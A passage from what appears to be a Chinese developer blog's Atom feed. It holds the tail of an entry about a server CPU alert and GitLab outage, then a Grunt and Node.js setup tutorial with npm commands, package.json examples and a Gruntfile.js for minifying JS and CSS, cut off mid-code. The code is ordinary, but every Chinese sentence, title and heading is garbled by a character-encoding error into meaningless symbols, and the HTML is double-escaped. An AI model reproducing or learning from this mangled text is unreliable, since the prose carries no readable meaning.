      &lt;p&gt;ä»Šå¤©æ—©ä¸Š5ç‚¹å¤šæ”¶åˆ°é˜¿é‡Œäº‘çš„å‘Šè­¦ï¼šæœåŠ¡å™¨CPUç™¾åˆ†ç™¾ï¼ŒgitlabæœåŠ¡å™¨è®¿é—®å‡ºç°500ï¼Œç¬¬ä¸€æ—¶é—´æ’æŸ¥é—®é¢˜ã€‚&lt;br&gt;æ¯•ç«Ÿè¿™ä¸ªå…³ä¹ç€å¼€å‘ä»Šå¤©å¯èƒ½æ— æ³•æäº¤ä»£ç ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anqua
    
    </summary>
    
      <category term="è¿ç»´å®‰å…¨" scheme="http://blog.yangcvo.me/categories/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Operation safety" scheme="http://blog.yangcvo.me/tags/Operation-safety/"/>
    
  </entry>
  
  <entry>
    <title>Node.js+Gruntå·¥å…·æ­å»ºåå°ç®¡ç†å®è·µ</title>
    <link href="http://blog.yangcvo.me/2016/11/24/Node.js/Node.js-Grunt%E5%B7%A5%E5%85%B7%E6%90%AD%E5%BB%BA%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%AE%9E%E8%B7%B5/"/>
    <id>http://blog.yangcvo.me/2016/11/24/Node.js/Node.js-Gruntå·¥å…·æ­å»ºåå°ç®¡ç†å®è·µ/</id>
    <published>2016-11-24T10:14:35.000Z</published>
    <updated>2017-03-29T10:17:35.000Z</updated>
    
    <content type="html">&lt;p&gt;æœ€è¿‘å¼„ç°åº¦å‘å¸ƒç³»ç»Ÿï¼Œç”±äºæœ€è¿‘ä½“æ£€é¡¹ç›®éœ€è¦å¯¹cssæ–‡ä»¶å’Œjsæ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼Œå„ç§æ¯”è¾ƒä¹‹åï¼Œé€‰æ‹©äº†gruntè¿›è¡Œæ„å»ºã€‚googleä¸€ä¸‹ï¼Œå‡ ä¹éƒ½æ˜¯gruntæœ€æ–°ç‰ˆçš„ä½¿ç”¨è¯´æ˜ æŸ¥çœ‹gruntjsçš„å…¥é—¨ Getting startedï¼Œåˆæ˜¯äº‘é‡Œé›¾é‡Œçš„ï¼Œå¥½å§ï¼Œåªèƒ½è€å¿ƒçœ‹æ–‡æ¡£å’Œä¸æ–­çš„å®è·µå§ã€‚&lt;/p&gt;
&lt;h2 id=&quot;Gruntå…¥é—¨&quot;&gt;&lt;a href=&quot;#Gruntå…¥é—¨&quot; class=&quot;headerlink&quot; title=&quot;Gruntå…¥é—¨&quot;&gt;&lt;/a&gt;Gruntå…¥é—¨&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/yangcvo/Grunt.git&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;å…¥é—¨æ•™ç¨‹:&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;ç³»ç»Ÿç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#ç³»ç»Ÿç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;ç³»ç»Ÿç¯å¢ƒ&quot;&gt;&lt;/a&gt;ç³»ç»Ÿç¯å¢ƒ&lt;/h3&gt;&lt;p&gt;centos 6.6 x64&lt;/p&gt;
&lt;h3 id=&quot;Gruntå®‰è£…è¿‡ç¨‹ï¼š&quot;&gt;&lt;a href=&quot;#Gruntå®‰è£…è¿‡ç¨‹ï¼š&quot; class=&quot;headerlink&quot; title=&quot;Gruntå®‰è£…è¿‡ç¨‹ï¼š&quot;&gt;&lt;/a&gt;Gruntå®‰è£…è¿‡ç¨‹ï¼š&lt;/h3&gt;&lt;p&gt;1ã€å‰æå®‰è£…äº†nodejsï¼Œè¿›å…¥å®˜ç½‘å(&lt;a href=&quot;http://nodejs.org/)ï¼Œç‚¹å‡»â€œINSTALLâ€æŒ‰é’®ï¼Œå°±ä¼šä¸‹è½½ç„¶åå®‰è£…å°±è¡Œäº†ã€‚è§‰å¾—ç°åœ¨windowså®‰è£…nodeï¼ŒæŒºç®€å•çš„ï¼Œæ„Ÿè§‰ç¨³å®šæ€§ä¹Ÿæå‡äº†ä¸å°‘ã€‚&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://nodejs.org/)ï¼Œç‚¹å‡»â€œINSTALLâ€æŒ‰é’®ï¼Œå°±ä¼šä¸‹è½½ç„¶åå®‰è£…å°±è¡Œäº†ã€‚è§‰å¾—ç°åœ¨windowså®‰è£…nodeï¼ŒæŒºç®€å•çš„ï¼Œæ„Ÿè§‰ç¨³å®šæ€§ä¹Ÿæå‡äº†ä¸å°‘ã€‚&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2ã€å®‰è£…gruntå‘½ä»¤è¡Œå·¥å…·ï¼Œæœ‰ä¸€å¥è¯æ€»ç»“â€œå°±æ˜¯å®‰è£…å®ŒCLIï¼Œè¿˜è¦åœ¨é¡¹ç›®å®‰è£…Gruntã€‚â€&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;npm install -g grunt-cli&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å®‰è£…gruntåŠå…¶æ’ä»¶ï¼Œè¿›å…¥åˆ°æŸé¡¹ç›®æ ¹ç›®å½•ï¼Œåœ¨å‘½ä»¤è¡Œæ¨¡å¼ä¸‹ï¼Œä¾‹å¦‚æ–‡ä»¶åœ¨cç›˜testGruntç›®å½•ä¸‹ï¼Œåˆ©ç”¨cdå‘½ä»¤åˆ°testGruntç›®å½•ä¸‹åï¼Œä½¿ç”¨å‘½ä»¤: &lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;npm install grunt --save-dev&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;3ã€è¾“å…¥ç‰ˆæœ¬å·éªŒè¯å®‰è£…æ˜¯å¦æˆåŠŸï¼Œè¾“å…¥ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;grunt -version&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;åœ¨è¿™é‡Œæˆ‘é€‰æ‹©ä¸€ä¸ªå­˜æ”¾åå°ç®¡ç†çš„æ–‡ä»¶ç›®å½•ã€‚&lt;/p&gt;
&lt;h3 id=&quot;åˆ›å»ºgrunté¡¹ç›®&quot;&gt;&lt;a href=&quot;#åˆ›å»ºgrunté¡¹ç›®&quot; class=&quot;headerlink&quot; title=&quot;åˆ›å»ºgrunté¡¹ç›®&quot;&gt;&lt;/a&gt;åˆ›å»ºgrunté¡¹ç›®&lt;/h3&gt;&lt;p&gt;grunté¡¹ç›®ä¸€èˆ¬éœ€è¦ä»¥ä¸‹å†…å®¹:&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1 ã€gruntï¼ˆ éœ€è¦å®‰è£…ï¼‰&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2ã€ grunt æ’ä»¶ ï¼ˆéœ€è¦å®‰è£…ï¼‰ &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3ã€package.json å’Œ Gruntfile.js ã€‚&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;(å®˜æ–¹å…¥é—¨Getting started è¯´é€šè¿‡ grunt-init å’Œ npm init åˆ›å»ºã€‚å¯¹äºå…¥é—¨æ¥è¯´ï¼Œè¿™ä¸¤ä¸­æ–¹å¼éƒ½ä¸å¤ªå¥½ç”¨ã€‚æ¨èç›´æ¥åˆ›å»º package.json å’ŒGruntfile.js æ–‡ä»¶)&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæˆ‘ä¹‹å‰åˆ›å»ºè¿‡ï¼Œç›´æ¥åœ¨å…¶ä»–æœºå™¨ä¸Šé¢cpè¿‡æ¥å³å¯äº†ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1.åˆ›å»ºæ–‡ä»¶å¤¹:health-Grunt &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2.åœ¨health-Gruntä¸‹é¢åˆ›å»º2ä¸ªæ–‡ä»¶package.json å’Œ Gruntfile.js&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;### å®˜ç½‘æ¨èï¼š&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;``` bash &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;package.json å†…å®¹å¦‚ä¸‹&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;smeitejs&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;version&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;0.1.0&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;description&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;js for smeite.com&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;homepage&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;http://cc.com/&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;author&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;helath &amp;lt;cc@qq.com&amp;gt;&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;devDependencies&quot;&lt;/span&gt;: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;grunt&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;~0.4.1&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;grunt-contrib-jshint&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;~0.3.0&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;grunt-contrib-nodeunit&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;~0.1.2&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;grunt-contrib-cssmin&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;~0.5.0&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;è¿™é‡Œæˆ‘è´´å‡ºæˆ‘çš„æœ¬åœ°é…ç½®ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;grunt_project&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;version&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;1.0.0&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;description&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;main&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;index.js&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;scripts&quot;&lt;/span&gt;: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;test&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;echo \&quot;Error: no test specified\&quot; &amp;amp;&amp;amp; exit 1&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;author&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;license&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;ISC&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;devDependencies&quot;&lt;/span&gt;: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;grunt&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^0.4.5&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;grunt-contrib-connect&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^0.11.2&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;grunt-contrib-watch&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^0.6.1&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;Gruntfile-js&quot;&gt;&lt;a href=&quot;#Gruntfile-js&quot; class=&quot;headerlink&quot; title=&quot;Gruntfile.js&quot;&gt;&lt;/a&gt;Gruntfile.js&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;module.exports = &lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(grunt) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;// Project configuration.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;grunt.initConfig(&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  uglify: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    options: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      mangle: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    build: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      files: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&#39;assets/config.min.js&#39;&lt;/span&gt;: [&lt;span class=&quot;string&quot;&gt;&#39;js/config.js&#39;&lt;/span&gt;],&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;         &lt;span class=&quot;string&quot;&gt;&#39;assets/smeite.min.js&#39;&lt;/span&gt;: [&lt;span class=&quot;string&quot;&gt;&#39;js/smeite.js&#39;&lt;/span&gt;],&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	 &lt;span class=&quot;string&quot;&gt;&#39;assets/index.min.js&#39;&lt;/span&gt;: [&lt;span class=&quot;string&quot;&gt;&#39;js/index.js&#39;&lt;/span&gt;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cssmin: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  compress: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    files: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;string&quot;&gt;&#39;assets/all.min.css&#39;&lt;/span&gt;: [&lt;span class=&quot;string&quot;&gt;&#39;css/base.css&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;css/global.css&#39;&lt;/span&gt;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; // smeite: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  //  files: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  //    &lt;span class=&quot;string&quot;&gt;&#39;assets/smeite.all.css&#39;&lt;/span&gt;: [&lt;span class=&quot;string&quot;&gt;&#39;/play21/smeite.com/public/assets/css/**/*.css&#39;&lt;/span&gt;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  //  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; // &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  with_banner: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    options: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      banner: &lt;span class=&quot;string&quot;&gt;&#39;/* My minified css file test test */&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    files: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;string&quot;&gt;&#39;assets/min/base.css&#39;&lt;/span&gt;: [&lt;span class=&quot;string&quot;&gt;&#39;css/base.css&#39;&lt;/span&gt;],&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;string&quot;&gt;&#39;assets/min/global.css&#39;&lt;/span&gt;: [&lt;span class=&quot;string&quot;&gt;&#39;css/global.css&#39;&lt;/span&gt;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  // Load the plugin that provides the &lt;span class=&quot;string&quot;&gt;&quot;uglify&quot;&lt;/span&gt; task.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  grunt.loadNpmTasks(&lt;span class=&quot;string&quot;&gt;&#39;grunt-contrib-uglify&#39;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  grunt.loadNpmTasks(&lt;span class=&quot;string&quot;&gt;&#39;grunt-contrib-cssmin&#39;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  // Default task(s).&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  grunt.registerTask(&lt;span class=&quot;string&quot;&gt;&#39;default&#39;&lt;/span&gt;, [&lt;span class=&quot;string&quot;&gt;&#39;uglify&#39;&lt;/span&gt;]);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;è¿™é‡Œæˆ‘è‡ªå·±é…ç½®çš„ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div 